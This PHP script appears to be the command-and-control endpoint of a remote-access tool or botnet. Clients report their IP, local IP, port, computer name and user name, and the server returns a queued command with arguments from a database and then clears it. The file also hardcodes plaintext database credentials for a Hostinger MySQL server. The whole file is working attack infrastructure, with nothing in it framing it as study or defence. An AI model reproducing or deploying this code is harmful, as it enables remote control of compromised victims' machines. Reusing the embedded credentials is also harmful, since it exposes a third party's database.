<?php
	$bdd = new PDO('mysql:host=mysql.hostinger.fr;dbname=u950431307_sql0;charset=utf8', 'u950431307_yop', '123bonsoir');
	$ip = $_SERVER['REMOTE_ADDR'];
    $ipLocal = $_GET['ipLocal'];
	$port = $_GET['port'];
	$computerName = $_GET['compName'];
	$userName = $_GET['userName'];
		
	$reponse = $bdd->prepare('SELECT * FROM ls WHERE ip = :IP AND ipLocal = :IPLOCAL AND port = :PORT AND pc_name = :COMPNAME AND user_name = :USER');
	$reponse->execute(array(
		'IP' => $ip,
		'IPLOCAL' => $ipLocal,
		'PORT' => $port,
		'COMPNAME' => $computerName,
		'USER' => $userName
	));
	
	$yop = 0;
	
	while($donnes = $reponse->fetch())
	{
		$yop = 1;
		echo $donnes['cmd'] . "\n" . $donnes['arg1'] . "\n" . $donnes['arg2'] . "\n" . $donnes['arg3'];
	}
	$reponse->closeCursor();

	$req2 = $bdd->prepare('UPDATE ls SET cmd = :CMD WHERE ip = :IP AND ipLocal = :IPLOCAL AND port = :PORT AND pc_name = :COMPNAME AND user_name = :USER');
			$req2->execute(array(
			'IP' => $ip,
			'IPLOCAL' => $ipLocal,
			'PORT' => $port,
			'COMPNAME' => $computerName,
			'USER' => $userName,
			'CMD' => 'NULL'
			));
?>